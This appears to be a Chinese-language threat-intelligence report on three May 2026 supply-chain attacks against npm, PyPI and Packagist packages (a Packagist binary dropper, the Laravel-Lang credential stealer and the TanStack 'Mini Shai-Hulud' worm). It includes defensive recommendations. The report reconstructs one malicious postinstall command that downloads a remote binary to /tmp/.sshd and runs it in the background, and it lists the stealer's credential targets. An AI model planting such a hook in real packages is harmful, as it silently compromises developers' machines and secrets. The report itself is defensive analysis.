📋 Executive Summary

2026 年 5 月 11 日至 23 日，npm、PyPI 與 Packagist 三大套件生態系在 12 天內連續遭受供應鏈攻擊，波及 GitHub、Grafana、OpenAI、Mistral AI 等知名組織及數千名開發者。本報告分析三起獨立（但在時序與手法上高度相關）的攻擊事件，並提出聯合防禦建議。

三起事件摘要

事件攻擊者目標生態系手法影響規模
① Packagist 8 套件 未知（parikhpreyash4） Packagist / PHP package.json postinstall → Linux binary 8 個套件 / 777 個 GitHub 引用
② Laravel-Lang 未知 Packagist / PHP GitHub tag 劫持 → PHP 憑證竊取器 233 版本 / 700 GitHub repos
③ TanStack / Mini Shai-Hulud TeamPCP npm / PyPI 自我繁殖 worm → OIDC token 竊取 400+ 套件版本 / GitHub 3,800 repos

核心發現：事件③（TeamPCP）的完整攻擊代碼於 5/12 公開釋出，事件①②恰好在同週爆發，顯示公開的攻擊框架可能對 PHP 生態系形成了催化效應。三起事件共同指向同一攻擊面：開發者對套件管理器與 CI/CD pipeline 的信任假設。

🎯 攻擊者背景

TeamPCP（事件③確認，事件①② 尚無歸因）

已知的 TeamPCP 攻擊歷程：

  • 2026-03：攻陷 Aqua Security Trivy（容器安全掃描工具 npm 套件）
  • 2026-04：攻陷 Bitwarden CLI npm 套件
  • 2026-05-11：Mini Shai-Hulud v2 啟動，攻陷 TanStack（每週數百萬次下載），自我繁殖至 400+ 套件

TeamPCP 技術標誌：使用 OIDC token 竊取實現自我繁殖、在 Claude Code、VS Code 及 OS 層服務安裝持久性後門、首個產生有效 SLSA Build Level 3 證明的 npm worm。

未知攻擊者（事件①②）

事件①（Packagist 8 套件）與事件②（Laravel-Lang）目前無法歸因至特定組織。兩者採用不同 C2 基礎設施、不同 payload 語言（Linux binary vs PHP），但攻擊時序與 Mini Shai-Hulud 代碼公開高度重疊（+10 天內），不排除受到啟發的機會性攻擊者。

⚙️ 攻擊鏈技術分析

事件① Packagist 8 套件 — Linux Binary Dropper

受影響套件：moritz-sauer-13/silver、crosiersource/crosierlib-base、devdojo/wave、devdojo/genesis、katanaui/katana、Elitedevsquad/sidecar-laravel、r2luna/brain、baskarcm/tzi-chat-ui

攻擊手法（跨生態系規避）：惡意代碼未插入 composer.json（PHP 依賴管理），而是插入 package.json 的 postinstall 腳本。專注掃描 PHP 依賴的安全工具會跳過 JavaScript 生命週期 hook，形成盲區。

// package.json postinstall（重建，非原始代碼）
"scripts": {
  "postinstall": "curl -s https://github.com/parikhpreyash4/systemd-network-helper-aa5c751f/releases/download/v1/sshd -o /tmp/.sshd && chmod +x /tmp/.sshd && /tmp/.sshd &"
}

Payload 行為：Linux binary 儲存於 /tmp/.sshd（偽裝為系統進程），後台持續運行，具體行為尚未完整逆向（payload 源帳號已刪除）。研究人員在 GitHub 上找到 777 個引用相同 payload 的檔案，顯示攻擊規模超出已知 8 個套件。

事件② Laravel-Lang — PHP 憑證竊取器（15 模組）

受影響套件：laravel-lang/lang（7,800 stars）、laravel-lang/attributes、laravel-lang/http-statuses

攻擊手法（GitHub tag 劫持）：GitHub 允許版本 tag 指向 fork 的 commit。攻擊者建立惡意 fork，修改 src/helpers.php，再將官方套件的 tag 指向惡意 fork 的 commit。開發者透過 Composer 安裝時，autoload 機制自動執行惡意 helpers.php，躲過標準 repository audit（malware 未出現在官方 repo diff 中）。

Payload 架構：~5,900 行 PHP，分為 15 個專業收集模組，AES-256 加密後傳至 flipboxstudio[.]info/exfil。

收集目標分類具體項目
雲端憑證AWS access/secret/session keys、GCP、Azure、DigitalOcean、Heroku、Vercel
基礎設施機密Kubernetes configs、HashiCorp Vault tokens、Docker credentials
開發者憑證SSH keys、git configs、shell history（.bash_history / .zsh_history）
瀏覽器密碼17 個 Chromium 系瀏覽器（Chrome、Edge、Brave 等）
通訊工具Slack、Discord、Telegram tokens
加密貨幣各主流錢包 seed phrases 與 private keys
其他所有 .env 檔案、VPN 配置

感染標記：.laravel_locale/ 目錄（含 MD5 hash、PHP、VBS 檔案），可用於偵測感染。

事件③ TanStack / Mini Shai-Hulud — 自我繁殖 Worm

四階段攻擊鏈：

  1. Payload Staging：攻擊者在 fork commit 79ac49ee 中植入 2.3 MB 混淆 JavaScript
  2. Package Injection：在 optionalDependencies 指向惡意 fork，在 package root 嵌入 router_init.js
  3. CI/CD Hijacking：透過 OIDC token（在 GitHub Actions runner process memory 中讀取）發布帶有有效 SLSA Level 3 attestation 的惡意版本——繞過 attestation 驗證防線
  4. 自我繁殖：worm 枚舉 maintainer 的所有套件，用竊取的 npm token 自動感染，5 小時內波及 400+ 套件 / 172 個命名空間

竊取目標：GitHub Actions runner process memory（100+ 個路徑的雲端 / 加密貨幣 / AI 工具憑證）

持久性（特別警示）：payload 在 Claude Code、VS Code 及 OS 層服務安裝開機持久性 hook，存活於重啟後。

Grafana 側攻擊鏈：TanStack 套件感染 Grafana CI/CD → 竊取 GitHub workflow token → token rotation 遺漏一個 → 攻擊者 5/16 發出勒索要求 → Grafana 拒付，確認 codebase（public + private）與業務聯絡資訊遭下載，但未被修改，客戶生產系統未受影響。

⚠️ 衝擊評估

直接衝擊

  • GitHub：3,800 個私有 repo 外洩，包含內部原始碼與憑證
  • Grafana Labs：public + private source code、內部 operational data、業務聯絡資訊遭下載；收到勒索要求（已拒付）
  • OpenAI：2 名企業環境員工確認受影響
  • Mistral AI、UiPath、OpenSearch、Guardrails AI 等：npm 套件被 worm 感染（已清除）

潛在長尾風險

  • Laravel-Lang 的 C2 竊取範圍極廣：若受感染環境持有 AWS production keys，攻擊者可能已取得雲端基礎設施存取權，影響遠超 GitHub 環境
  • Packagist payload 尚未完整分析：/tmp/.sshd binary 的完整行為未知，777 個 GitHub 引用暗示攻擊規模可能被低估
  • Mini Shai-Hulud 持久性：已在 Claude Code / VS Code / OS 層安裝 hook，受感染機器即使清除 npm 套件後仍可能保留後門
  • SLSA attestation 信任破壞：Mini Shai-Hulud 是首個產生有效 SLSA Level 3 attestation 的 npm worm，意味著 attestation 驗證本身不再是充分防線
📊 深度分析

三起事件的關聯性評估

三起事件雖無直接技術重疊確認，但存在以下結構性關聯：

1. 時序關聯：Mini Shai-Hulud 代碼公開觸發效應

Mini Shai-Hulud 完整攻擊代碼於 5/12 公開釋出。事件①②分別於 5/21~5/23 爆發，間隔約 10 天——符合「研究 / 適配攻擊代碼至目標生態系」的典型時間窗口。PHP 生態系的雙重攻擊可能是受 npm 端攻擊框架啟發的機會性攻擊者，而非同一組織延伸行動。

2. 共同攻擊面：開發者對套件管理器的信任

三起事件均利用同一根本假設：「從官方套件管理器安裝的套件是安全的」。不同的是攻擊切入點：

  • 事件①：劫持 package.json（PHP 開發者不看 JS 依賴）
  • 事件②：劫持 GitHub tag（Packagist 驗證 tag 存在，但不驗證 tag 指向的 commit 來源）
  • 事件③：劫持 CI/CD OIDC token（繞過 code review，直接在 release pipeline 注入）

3. 差異：攻擊目標與成熟度

面向事件① Packagist事件② Laravel-Lang事件③ TanStack
技術成熟度低（簡單 postinstall）中（GitHub tag exploit + 15 模組 stealer）高（自我繁殖 worm + SLSA bypass）
目標一般 PHP 開發環境開發者高價值憑證（AWS、Cloud）CI/CD token → 大型組織 repo
持久性未知（/tmp/.sshd）無（一次性竊取）有（Claude Code / VS Code hook）
自我繁殖無無（但自動化 tagging 暗示腳本化）有（核心設計）

結論

三起事件很可能來自不同攻擊者，但共享了一個催化背景：Mini Shai-Hulud 代碼公開後，開發者生態系供應鏈攻擊的技術門檻顯著降低。本次「三連爆」是 2026 年供應鏈攻擊從「APT 專屬」走向「大眾化」的具體體現。

⚖️ 爭議與未確認事項
  • 事件①②攻擊者身份：目前無任何組織對事件①②認責，亦無技術歸因報告。TeamPCP 關聯為推測，非確認事實。
  • Packagist /tmp/.sshd 完整行為：payload GitHub 帳號已刪除，binary 行為分析依賴有限逆向資料，後期行為（如資料外洩方式）尚未完整記錄。
  • Laravel-Lang 攻擊者取得 repo 存取的路徑：研究人員推測攻擊者取得了組織層級憑證或 release 基礎設施存取權，但確切入侵向量未公開。
  • 受影響用戶總數：Laravel-Lang/lang 有 7,800 GitHub stars，但實際受感染安裝次數未有官方統計。
  • Cloudsmith「Mini Shai-Hulud reaches Packagist」報告：標題暗示 Mini Shai-Hulud 延伸至 Packagist，但本報告撰寫時無法取得全文確認技術細節。
🛡️ 防禦建議

緊急行動（立即）

  1. 移除受影響套件版本
    • Laravel-Lang：確認 laravel-lang/lang、laravel-lang/attributes、laravel-lang/http-statuses 版本是否在 5/22~5/23 受污染窗口內
    • Packagist：確認是否使用上述 8 個套件的受影響版本
    • TanStack：確認 CI/CD pipeline 於 5/11 前後是否消費過任何 @tanstack 套件
  2. 感染標記掃描：find / -name ".laravel_locale" 2>/dev/null（Laravel-Lang）、ls /tmp/.sshd（Packagist）
  3. 全面輪換憑證：任何在受影響窗口執行過上述套件的機器，需輪換 AWS keys、GitHub PAT、npm tokens、SSH keys、所有 .env 中的機密
  4. Claude Code 環境檢查：若機器曾消費 TanStack 套件（5/11 前後），需檢查 Claude Code 配置是否被修改（TeamPCP payload 明確針對 Claude Code 安裝持久性）

中期改善（1–2 週）

  1. CI/CD 最小化 OIDC token 範圍：GitHub Actions workflow 的 permissions 設定明確限縮至最小必要（如 contents: read），禁止 release workflow 擁有 publish 以外的 token 範圍
  2. 套件 lockfile 強制 commit hash pinning：composer.lock / package-lock.json 應 pin 到 commit hash，而非僅 tag 名稱（可防範 GitHub tag 劫持）
  3. postinstall script 管控：使用 npm ci --ignore-scripts 或在 CI 環境停用 postinstall，防範事件①手法
  4. 異常出站流量監控：偵測對 flipboxstudio[.]info 等非預期域名的 HTTPS 請求（可能已有其他未識別 C2）

長期架構調整

  1. SLSA attestation 不再是充分防線：Mini Shai-Hulud 已示範有效 attestation 可被繞過，需在 attestation 驗證之外加上行為分析（如 Bumblebee / StepSecurity AI Package Analyst）
  2. 開發者端點 inventory：工具如 Perplexity AI 的 Bumblebee 可掃描哪些機器裝了問題套件，建議納入 incident response 流程
  3. PHP 生態系特別注意：Packagist 目前無 npm 的 2FA-gated publishing 等級的保護，PHP 開發團隊應優先升級套件 signing 流程
